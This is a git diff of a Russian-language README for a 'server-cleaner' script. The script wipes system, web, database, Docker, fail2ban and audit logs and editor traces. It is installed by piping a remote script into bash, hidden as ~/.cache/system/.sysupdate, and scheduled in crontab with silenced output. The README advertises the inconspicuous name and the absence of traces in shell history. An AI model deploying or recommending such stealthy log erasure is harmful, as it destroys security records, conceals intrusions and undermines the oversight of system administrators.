@@ -11,7 +11,7 @@
 - Журналы systemd (journald)
 - Логи веб-серверов (nginx, apache)
 - Логи баз данных (MySQL, PostgreSQL, Redis)
-- Логи Docker контейнеров
+- Логи Docker контейнеров (только логи, образы не трогаются)
 - Логи fail2ban и audit
 - Следы работы в редакторах (vim, nano, less)
 - Coredumps
@@ -40,6 +40,24 @@ wget -qO- https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/insta
 3. Добавляет задачу в crontab (ежедневно в 00:00)
 4. Предлагает запустить сразу
 
+## 🗑️ Удаление
+
+### Автоматическое удаление:
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/uninstall.sh | bash
+```
+
+### Ручное удаление:
+
+```bash
+# Удалить из crontab
+crontab -l | grep -v '.sysupdate' | crontab -
+
+# Удалить скрипт
+rm -f ~/.cache/system/.sysupdate
+```
+
 ## 📋 Ручная установка
 
 ### Разовый запуск (без сохранения):
@@ -61,7 +79,7 @@ wget -O ~/.cache/system/.sysupdate https://raw.githubusercontent.com/HVHBIGNAME/
 chmod +x ~/.cache/system/.sysupdate
 
 # Добавить в crontab (каждый день в 00:00)
-(crontab -l 2>/dev/null; echo "0 0 * * * ~/.cache/system/.sysupdate >/dev/null 2>&1") | crontab -
+(crontab -l 2>/dev/null; echo "0 0 * * * /bin/bash ~/.cache/system/.sysupdate >/dev/null 2>&1") | crontab -
 ```
 
 ## 🛠️ Управление
@@ -75,24 +93,20 @@ crontab -l
 ### Запустить вручную:
 
 ```bash
-sudo ~/.cache/system/.sysupdate
+bash ~/.cache/system/.sysupdate
 ```
 
-### Удалить из crontab:
+или под root:
 
 ```bash
-crontab -e
-# Удалите строку с .sysupdate и сохраните
+sudo bash ~/.cache/system/.sysupdate
 ```
 
-### Полное удаление:
+### Обновить до последней версии:
 
 ```bash
-# Удалить из crontab
-crontab -l | grep -v '.sysupdate' | crontab -
-
-# Удалить скрипт
-rm -f ~/.cache/system/.sysupdate
+curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh -o ~/.cache/system/.sysupdate
+chmod +x ~/.cache/system/.sysupdate
 ```
 
 ## 📝 Что очищает скрипт
@@ -132,9 +146,9 @@ rm -f ~/.cache/system/.sysupdate
 - `/var/log/postgresql/*` — логи PostgreSQL
 - `/var/log/redis/*` — логи Redis
 
-### 🐳 Docker (если установлен)
+### 🐳 Docker
 - `/var/lib/docker/containers/*/*-json.log` — логи контейнеров
-- `docker system prune -af --volumes` — очистка неиспользуемых образов и кеша
+- **Образы и volumes НЕ удаляются!**
 
 ### 🛡️ Логи безопасности
 - `/var/log/fail2ban.log` — логи fail2ban
@@ -153,7 +167,7 @@ rm -f ~/.cache/system/.sysupdate
 - ✅ Имеет незаметное имя `.sysupdate`
 - ✅ Запускается автоматически без следов в истории
 - ✅ Использует `>/dev/null 2>&1` в crontab
-- ✅ Очищает историю после своей работы
+- ✅ Совместим с `sh` и `bash`
 
 ## 💡 Особенности
 
@@ -162,11 +176,13 @@ rm -f ~/.cache/system/.sysupdate
 - **Совместимость**: Проверяет наличие команд перед использованием
 - **Комплексность**: Очищает следы из всех популярных сервисов
 - **Автоматизация**: Однократная установка, работает постоянно
+- **Мягкая очистка Docker**: Удаляет только логи, образы остаются
 
 ## 📦 Файлы
 
 - `clean.sh` — основной скрипт очистки
 - `install.sh` — скрипт автоматической установки
+- `uninstall.sh` — скрипт удаления
 
 ## 🔄 Обновление
 
